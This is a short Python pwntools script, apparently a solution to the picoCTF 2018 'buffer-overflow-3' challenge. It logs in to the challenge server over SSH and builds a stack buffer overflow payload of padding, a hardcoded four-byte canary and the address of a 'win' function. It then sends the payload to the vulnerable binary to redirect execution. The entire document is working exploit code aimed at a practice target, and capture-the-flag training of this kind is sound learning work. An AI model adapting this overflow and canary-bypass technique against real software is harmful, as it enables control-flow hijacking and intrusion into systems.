from pwn import *

s = ssh(host = '2018shell2.picoctf.com', user = 'user', password = 'pass')

win_ = 0x80486eb
canary = "\x52\x67\x63\x64"
buf = "A"*32
buf += canary
buf += "b"*16
buf += p32(win_)

p =  s.process('./vuln', cwd = '/problems/buffer-overflow-3_0_dcd896c1491ad710043225eda6abcd8a')

print(p.recvuntil('> '))
print(p.sendline('1000000'))

print(p.recvuntil('> '))
print(p.send(buf))
print(p.recv())
